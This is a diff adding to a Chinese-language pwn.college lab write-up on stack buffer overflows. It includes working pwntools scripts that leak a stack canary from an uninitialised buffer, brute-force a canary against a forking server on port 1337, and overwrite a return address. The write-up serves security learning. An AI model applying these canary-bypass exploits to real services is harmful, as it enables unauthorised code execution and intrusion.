@@ -20,6 +20,12 @@ tags:
 
 https://pwn.college/program-security/memory-errors/
 
+整体思路：
+1. 没有开启canary保护，缓冲区直接溢出返回地址。
+2. 开启canary保护，有puts等回显，可以溢出显示canary的值。然后重复调用函数，溢出返回地址。
+3. 开启canary保护，有puts等回显，缓冲区在创建的时候没有置0，可以用过gdb调试，观察缓冲区位置中是否包含canary的值。
+4. 开启canary保护，没有回显，只能爆破。且这种方式仅限于监听端口的服务端类似level15。如果是独立的程序，每次重启，canary都会重新计算，而且这一次只能接受一次输入。没有爆破的可能。
+
 ## 值得记录的问题
 
 ### 1. python 中 pwn库 的使用
@@ -917,4 +923,149 @@ p.interactive()
 
 ## level 14
 
+这个题跟之前不一样的地方，之前是用puts输出，它会从缓冲区的开头一直到遇到一个00子节。但是现在是printf输出，它通过format字符串指定了可以输出的最大字节数`printf("You said: %.424s\n", (const char *)buf);`,而这个大小是小于溢出时可以显示canary的字节数的。
+
+本题的缓冲区在创建的时候没有初始化，这导致缓冲区中有可能存在有之前函数的栈帧数据还没有被清零。所以可以通过在缓冲区中找可能的canary值。前面也说过了，canary的值的特征就是开头是`\x00`的八个随机字节组成的随机数。
+
+.0这一关可以通过打印的栈空间来找。
+.1只能自己通过gdb，注意按汇编指令执行到`fs:26h`保存到`ebp-8`的位置之后，在打印栈空间的内容。然后对比缓冲区中是否包含有canary值。在计算偏移量就行。
+
+```python
+
+from pwn import *
+elf = ELF("/challenge/babymem_level14.1")
+p = process("/challenge/babymem_level14.1")
+buffer_size = 19 * 8 + 1
+p.sendline(f"{buffer_size}")
+p.send(b'REPEAT' + b'A'* (buffer_size-6) )
+output = p.recvuntil(b'Backdoor triggered! Repeating challenge()')
+# print(output)
+match = re.search(r'^(You said: REPEATAAA+.*?)$', output.decode('latin-1'), re.MULTILINE)
+if match:
+    line = match.group(1)
+    print(line)
+    line = line[10+buffer_size: 10+buffer_size+7]
+    cancary =  line.encode('latin-1')
+    hex_str = ''.join(f'{byte:02x}' for byte in cancary[::-1]) + "00"
+    print(hex_str)
+    cancary_value = p64(int(hex_str, 16))
+    print(f"Test! {cancary_value}")
+else:
+    print("No matching line found")
+
+buffer_size = 0x1A8 + 8 + 8 + 2
+p.sendline(f"{buffer_size}")
+p.send(b'A'*0x1A8 + cancary_value + 8* b'A' +  b'\x7D\x19')
+
+p.interactive()
+exit()
+
+
+from pwn import *
+elf = ELF("/challenge/babymem_level14.0")
+p = process("/challenge/babymem_level14.0")
+buffer_size = 0x9
+p.sendline(f"{buffer_size}")
+p.send(b'REPEAT' + b'A'*3)
+output = p.recvuntil(b'Backdoor triggered! Repeating challenge()')
+match = re.search(r'^(You said: REPEATAAA+.*?)$', output.decode('latin-1'), re.MULTILINE)
+if match:
+    line = match.group(1)
+    line = line[19:26]
+    cancary =  line.encode('latin-1')
+    hex_str = ''.join(f'{byte:02x}' for byte in cancary[::-1]) + "00"
+    cancary_value = p64(int(hex_str, 16))
+    print(f"Test! {cancary_value}")
+else:
+    print("No matching line found")
+
+buffer_size = 0x118 + 8 + 8 + 2
+p.sendline(f"{buffer_size}")
+p.send(b'A'*0x118 + cancary_value + 8* b'A' +  b'\x98\x23')
+
+p.interactive()
+```
+
+
 ## level 15
+
+这一关就是爆破了。之前的程序都是独立程序，接受输入，然后输出。这一关的程序变成了服务端和客户端的交互，服务端监听1337端口，客户端向服务端发送数据，服务端使用fork启动新进程处理客户端的连接。这意味着你可以请求连接，然后重复发送数据达到爆破的效果。
+
+```python
+
+from pwn import *
+
+
+
+def burce_canary_value():
+    cancary_value = b''
+    i = 1
+    while i < 8:
+        # 连接到本地进程
+        for j in range(1, 256):
+                
+            conn = remote('127.0.0.1', target_port)
+
+            # 打印连接成功的消息
+            print(f"Connected to local process on port {target_port}")
+            response = conn.recvuntil("Payload size:")
+            # print(f"Received response: {response.decode()}")
+
+            buffer_size_ = buffer_size + extra_byte + i
+            if cancary_value != b'':
+                base_payload = (buffer_size_ - 1 - i) * b'A' + b'\x00' + cancary_value + bytes([j])
+            else:
+                base_payload = (buffer_size_ - 1 - i) * b'A' + b'\x00'  + bytes([j])
+
+            # 发送数据到本地进程
+            conn.sendline(f"{buffer_size_}")
+            conn.send(base_payload)
+            print(base_payload)
+            
+            # 接收本地进程返回的数据
+            response = conn.recvall(timeout=0.5)
+
+            if "stack smashing detected"  not in response.decode():
+                print("burce success !")
+                print(f"Received response: {response.decode()}")
+                cancary_value += bytes([j])
+                break
+
+            # 关闭连接
+            conn.close()
+
+        i += 1
+
+    print(cancary_value)
+    return cancary_value
+
+
+# 设置目标端口（本地进程监听的端口）
+target_port = 1337  # 目标端口
+buffer_size = 0x68
+extra_byte = 1
+
+cancary = burce_canary_value()
+# cancary = b'\x95>yh\x90l+'
+hex_str = ''.join(f'{byte:02x}' for byte in cancary[::-1]) + "00"
+cancary_value = p64(int(hex_str, 16))
+print(cancary_value)
+
+
+new_buffer_size = buffer_size + 8 + 8 + 2
+
+# 动态生成形如 \x17, \x27, \x37, ... \xf7 的字节序列
+change_address = [bytes([i]) for i in range(0x1F, 0x100, 0x10)]
+
+
+for address in change_address: 
+    conn = remote('127.0.0.1', target_port)
+    conn.recvuntil("Payload size:")
+    conn.sendline(f"{new_buffer_size}")
+    payload = buffer_size * b'A' + cancary_value + 8 * b'A' + b'\x5A' + address
+    conn.send(payload)
+    response = conn.recvall(timeout=1)
+    if "pwn" in response.decode():
+        print(response.decode())
+        exit()
+```
